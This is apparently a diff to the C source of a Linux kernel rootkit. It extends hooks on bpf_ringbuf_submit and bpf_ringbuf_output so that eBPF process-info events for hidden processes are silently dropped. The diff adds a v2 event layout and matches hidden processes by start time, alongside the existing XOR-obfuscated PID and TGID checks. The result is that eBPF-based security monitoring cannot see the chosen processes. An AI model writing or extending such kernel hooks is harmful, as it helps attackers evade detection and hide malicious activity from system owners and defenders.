@@ -19,12 +19,24 @@ struct bpf_iter_ctx_tcp  { struct bpf_iter_meta *meta; struct sock_common *sk_co
 struct bpf_iter_ctx_udp  { struct bpf_iter_meta *meta; struct udp_sock *udp_sk; uid_t uid; int bucket; };
 struct bpf_iter_ctx_task { struct bpf_iter_meta *meta; struct task_struct *task; };
 
-#define EBPF_PROCINFO_SIZE 32u
+#define EBPF_PROCINFO_V1_SIZE 32u
+#define EBPF_PROCINFO_V2_SIZE 48u
+
 struct ebpf_procinfo {
     u32 pid;
     u32 tgid;
     u8  comm[16];
     u64 last_seen;
+} __attribute__((packed));
+
+struct ebpf_procinfo_v2 {
+    u32 pid;
+    u32 tgid;
+    u8  comm[16];
+    u64 last_seen;
+    u64 start_time_ns;
+    u32 cpu;
+    u32 pad;
 } __attribute__((packed));
 
 struct ebpf_event_hdr { u64 ts; u64 tid; u32 len; u16 type; u32 nparams; } __attribute__((packed));
@@ -122,6 +134,26 @@ static notrace inline bool is_procinfo_event(const void *data)
     return p->last_seen >= 1000000000ULL;
 }
 
+static notrace inline bool is_procinfo_event_v2(const void *data, u64 size)
+{
+    const struct ebpf_procinfo_v2 *p;
+
+    if (!data || (unsigned long)data < PAGE_SIZE)
+        return false;
+    if (size != 0 && size < EBPF_PROCINFO_V2_SIZE)
+        return false;
+
+    p = (const struct ebpf_procinfo_v2 *)data;
+    if (p->last_seen < 1000000000ULL)
+        return false;
+    if (p->start_time_ns == 0 || p->start_time_ns < 1000000000ULL)
+        return false;
+    if (p->cpu >= 4096U)
+        return false;
+
+    return true;
+}
+
 static notrace inline bool is_ebpf_event(const void *data, u64 size)
 {
     const struct ebpf_event_hdr *h;
@@ -158,11 +190,41 @@ static notrace bool is_ext_event(const void *data, u32 size)
     return true;
 }
 
-static notrace inline bool should_suppress_procinfo(const struct ebpf_procinfo *p)
+static notrace bool should_hide_start_time_ns(u64 start_time_ns)
 {
-    u64 key       = get_obf_key();
-    u32 real_pid  = p->pid  ^ (u32)(key);
-    u32 real_tgid = p->tgid ^ (u32)(key >> 32);
+    int count, i;
+
+    if (start_time_ns == 0 || hidden_count <= 0 || hidden_count > MAX_HIDDEN_PIDS)
+        return false;
+
+    count = READ_ONCE(hidden_count);
+    if (count <= 0 || count > MAX_HIDDEN_PIDS)
+        return false;
+
+    for (i = 0; i < count; i++) {
+        if (READ_ONCE(hidden_start_times[i]) == start_time_ns)
+            return true;
+    }
+
+    return false;
+}
+
+static notrace inline bool should_suppress_procinfo(const void *data, u64 size)
+{
+    const struct ebpf_procinfo *p;
+    u64 key;
+    u32 real_pid, real_tgid;
+
+    if (!data)
+        return false;
+
+    if (is_procinfo_event_v2(data, size))
+        return should_hide_start_time_ns(((const struct ebpf_procinfo_v2 *)data)->start_time_ns);
+
+    p = (const struct ebpf_procinfo *)data;
+    key = get_obf_key();
+    real_pid  = p->pid  ^ (u32)(key);
+    real_tgid = p->tgid ^ (u32)(key >> 32);
     return should_hide_pid_by_int((int)real_pid) ||
            should_hide_pid_by_int((int)real_tgid);
 }
@@ -326,16 +388,14 @@ static void (*orig_bpf_ringbuf_submit)(void *data, u64 flags) = NULL;
 
 static notrace void hook_bpf_ringbuf_submit(void *data, u64 flags)
 {
-    const struct ebpf_procinfo   *pinfo;
     const struct ebpf_event_hdr *fhdr;
     bool suppress = false;
 
     if (!orig_bpf_ringbuf_submit) return;
     if (!data || (unsigned long)data < PAGE_SIZE) goto passthrough;
 
-    if (is_procinfo_event(data)) {
-        pinfo    = (const struct ebpf_procinfo *)data;
-        suppress = should_suppress_procinfo(pinfo);
+    if (is_procinfo_event_v2(data, 0) || is_procinfo_event(data)) {
+        suppress = should_suppress_procinfo(data, 0);
     }
 
     if (!suppress && is_ebpf_event(data, 0)) {
@@ -356,15 +416,14 @@ static long (*orig_bpf_ringbuf_output)(void *ringbuf, void *data, u64 size, u64 
 
 static notrace long hook_bpf_ringbuf_output(void *ringbuf, void *data, u64 size, u64 flags)
 {
-    const struct ebpf_procinfo   *pinfo;
     const struct ebpf_event_hdr *fhdr;
 
     if (!orig_bpf_ringbuf_output) return -ENOSYS;
     if (!data || !ringbuf) goto passthrough;
 
-    if (size >= EBPF_PROCINFO_SIZE && is_procinfo_event(data)) {
-        pinfo = (const struct ebpf_procinfo *)data;
-        if (should_suppress_procinfo(pinfo)) return 0;
+    if ((size >= EBPF_PROCINFO_V2_SIZE && is_procinfo_event_v2(data, size)) ||
+        (size >= EBPF_PROCINFO_V1_SIZE && is_procinfo_event(data))) {
+        if (should_suppress_procinfo(data, size)) return 0;
     }
 
     if (is_ebpf_event(data, size)) {
